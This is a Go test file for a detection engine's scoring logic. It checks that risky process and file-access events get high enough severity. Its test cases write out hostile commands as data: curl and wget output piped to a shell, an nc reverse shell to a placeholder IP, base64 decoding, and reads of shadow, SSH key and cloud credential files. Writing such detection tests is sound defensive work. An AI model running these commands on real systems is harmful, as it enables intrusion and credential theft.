package score

import (
	"strings"
	"testing"
)

func TestScoreExec(t *testing.T) {
	cases := []struct {
		name    string
		binary  string
		args    string
		minWant int
	}{
		{"plain bash", "/bin/bash", "", 0},
		{"bash -c", "/bin/bash", "-c 'echo hi'", 1},
		{"curl plain", "/usr/bin/curl", "https://example.com", 3},
		{"curl pipe sh", "/usr/bin/curl", "-fsSL https://x.example.com | sh", 25},
		{"wget pipe bash", "/usr/bin/wget", "-qO- https://x | bash", 25},
		{"nc reverse shell", "/usr/bin/nc", "-e /bin/bash 1.2.3.4 4444", 20},
		{"nc plain", "/usr/bin/nc", "-l 8080", 5},
		{"base64 decode", "/bin/bash", "-c 'echo aGk= | base64 -d'", 15},
		{"chmod +x", "/usr/bin/chmod", "+x /tmp/payload", 5},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _, _ := Score("process_exec", tc.binary, tc.args, "", 0)
			if got < tc.minWant {
				t.Fatalf("got=%d want>=%d", got, tc.minWant)
			}
		})
	}
}

func TestScoreKprobe(t *testing.T) {
	cases := []struct {
		name    string
		policy  string
		args    string
		wantMin int
	}{
		{"privilege-escalation", "privilege-escalation", "0", 15},
		{"shadow access", "sensitive-file-access", "/etc/shadow", 20},
		{"ssh access", "sensitive-file-access", "/root/.ssh/id_rsa", 20},
		{"sudoers access", "sensitive-file-access", "/etc/sudoers", 8},
		{"outbound", "outbound-connections", "", 12},
		{"unknown", "no-such-policy", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, _, _ := Score("process_kprobe", "/bin/bash", tc.args, tc.policy, 0)
			if got < tc.wantMin {
				t.Fatalf("got=%d want>=%d", got, tc.wantMin)
			}
		})
	}
}

func TestSeverity(t *testing.T) {
	cases := []struct {
		score int
		want  string
	}{
		{0, "info"},
		{4, "info"},
		{5, "low"},
		{9, "low"},
		{10, "medium"},
		{19, "medium"},
		{20, "high"},
		{39, "high"},
		{40, "critical"},
		{999, "critical"},
	}
	for _, tc := range cases {
		if got := Severity(tc.score); got != tc.want {
			t.Errorf("Severity(%d)=%q want %q", tc.score, got, tc.want)
		}
	}
}

func TestUnknownEventType(t *testing.T) {
	got, _, _ := Score("not_a_thing", "/bin/bash", "", "", 0)
	if got != 0 {
		t.Fatalf("unknown event type should score 0, got %d", got)
	}
}

// The credential policy had no case in scoreKprobe at all, so every event it
// produced scored 0 and never raised an alert. Verified against the live rig:
// a read of ~/.aws/credentials produced no alerts in the same command where
// /etc/shadow produced four.
func TestCredentialStoreReadIsScored(t *testing.T) {
	for _, path := range []string{
		"/home/ubuntu/.aws/credentials",
		"/home/ubuntu/.kube/config",
		"/home/ubuntu/.gnupg/secring.gpg",
		"/home/ubuntu/.netrc",
		"/etc/gshadow",
	} {
		got, reason, _ := Score("process_kprobe", "/bin/cat", path+" 4", "override-credential-read", 0)
		if got <= 0 {
			t.Fatalf("%s scored %d — credential theft would raise no alert", path, got)
		}
		if reason == "" {
			t.Fatalf("%s scored %d with no reason — an alert with no description is not triageable", path, got)
		}
	}
}

// The mask the policy matched on was being joined into the args and ending up
// verbatim in the description ("Sensitive file accessed: /etc/passwd 4").
func TestDescriptionDoesNotLeakTheArgMask(t *testing.T) {
	for _, policy := range []string{"sensitive-file-access", "override-credential-read"} {
		_, reason, _ := Score("process_kprobe", "/bin/cat", "/etc/shadow 4", policy, 0)
		if strings.HasSuffix(reason, " 4") || strings.Contains(reason, "shadow 4") {
			t.Fatalf("%s leaked the permission mask into the description: %q", policy, reason)
		}
	}
}

// Band must order the same way Severity labels do, or alerting on an increase
// in band would not correspond to an increase in reported severity.
func TestBandOrderingMatchesSeverity(t *testing.T) {
	cases := []struct {
		score int
		band  int
		sev   string
	}{{0, 0, "info"}, {5, 1, "low"}, {10, 2, "medium"}, {20, 3, "high"}, {40, 4, "critical"}, {179, 4, "critical"}}
	for _, c := range cases {
		if got := Band(c.score); got != c.band {
			t.Fatalf("Band(%d)=%d want %d", c.score, got, c.band)
		}
		if got := Severity(c.score); got != c.sev {
			t.Fatalf("Severity(%d)=%q want %q", c.score, got, c.sev)
		}
	}
	for i := 1; i < 200; i++ {
		if Band(i) < Band(i-1) {
			t.Fatalf("Band is not monotonic at %d", i)
		}
	}
}
